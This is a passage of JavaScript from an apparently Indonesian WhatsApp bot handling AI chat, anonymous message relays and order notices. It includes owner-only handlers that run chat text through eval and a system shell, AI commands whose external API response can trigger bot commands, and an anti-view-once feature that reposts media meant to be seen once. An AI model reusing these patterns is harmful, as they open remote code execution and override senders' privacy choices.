        await vreden.relayMessage(m.chat, response.message, {
          messageId: response.key.id,
        });
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ai': case 'chatgpt': {
if (!text) return m.reply('Iyaa kenafaa?')
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
try {
const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo?query=${encodeURIComponent(text)}&username=${m.sender}`)
const aireply = autoaii.result
if (autoaii.command.status) {
vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
await sleep(500)
balas("Okee, sekejap  😉")
} else {
balas(aireply)
}
} catch (error) {
m.reply("Terjadi kesalahan :\n\n" + error)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'simi': case 'simisimi': case 'sim': case 'gpt': {
try {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return m.reply('Iyaa kenafaa?')
let result = await fetchJson(`https://api.vreden.my.id/api/simi?query=${encodeURIComponent(text)}&lang=id`)
const gpt = result.result
balas(gpt)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ai2': case 'chatgpt2': {
if (!text) return m.reply('Iyaa kenafaa?')
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
try {
const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo2?query=${encodeURIComponent(text)}&username=${m.sender}`)
const aireply = autoaii.result
if (autoaii.command.status) {
vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
await sleep(500)
balas("Okee, sekejap  😉")
} else {
balas(aireply)
}
} catch (error) {
m.reply("Terjadi kesalahan :\n\n" + error)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ai3':{
try {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix}${command} Apa itu chatgpt`)
let gpt = await QiooBotika(text, m.sender)
m.reply(`${gpt}`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'confess': case 'menfes': case 'menfess':{
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return warning("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return warning('Fitur Khusus Di private chat!')
if (!text) return warning(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return warning(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return warning(`Awali dengan 62\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return warning(`Nomor Salah, Perhatikan Pemakaian\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan klik *balasmenfess* -- Untuk menerima menfess/confess\nSilahkan klik *tolakmenfess* -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Tolak Menfess\",\"id\":\".tolakmenfess\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Balas Menfess\",\"id\":\".balasmenfes\"}`
              }
           ]
sendButtonBiasa(nomorNya + '@s.whatsapp.net', `*Hi ada menfess nih buat kamu*`, yoi, button)
m.reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'balasmenfess': case 'balasmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return warning("Belum ada sesi menfess")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await vreden.sendMessage(other, {text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, mentions: [m.sender]})
vreden.sendMessage(m.chat, {text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return warning("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
vreden.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await vreden.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply("Menfess berhasil di tolak 🤚")
delete this.menfes[roof.id]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
 case 'stopconfess': case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return warning("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
vreden.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await m.reply("menfess di stop")
delete this.menfes[find.id]
}
 db.data.users[m.sender].exp += await randomNomor(20)
break
default:

if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!m.quoted) return warning('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
vreden.sendTextWithMentions(m.chat, anunya, m)
} else {
vreden.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && [`${db.data.users[m.sender].otp}`].includes(budy) && !isCmd) {
if (db.data.users[m.sender].daftar) return warning(`Anda Telah Terverifikasi!!`)
var angka = await randomNomor(1000, 9999)
const serialUser = `Player - ${angka}`
db.data.users[m.sender].nama = serialUser
balas(`------------ » *VERIFY AKUN* « ------------\n\n📦 *User Info*\n- Name : ${db.data.users[m.sender].nama}\n- ID : ${m.sender.split('@')[0]}\n\n🎁 *Bonus Verifikasi*\n- + Rp 5000\n- + 20 Limit\n\n> ${footxt}`)
db.data.users[m.sender].saldo += 5000
db.data.users[m.sender].limit += 20
db.data.users[m.sender].daftar = true
}
if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!m.quoted) return warning('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
vreden.sendTextWithMentions(m.chat, anunya, m)
} else {
vreden.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}
if (budy.startsWith('=> ')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(util.format(e))
}
}

if (budy.startsWith('> ')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(util.format(err))
}
}

if (budy.startsWith('$ ')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
if (m.mtype == 'viewOnceMessageV2') {
if (!setting.antiViewOnce) return
let msg = m.message.viewOnceMessageV2.message
 console.log(msg)
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
 for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
 }
let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

await vreden.sendTextWithMentions(m.chat, teks, m)
await delay(500)
if (/video/.test(type)) {
return vreden.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
}
else if (/image/.test(type)) {
return vreden.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.report = this.report ? this.report : {}
let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.report).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}

}


} catch (err) {
console.log(err)
//m.reply('Fitur Tersebut Tidak Ada!')
//m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
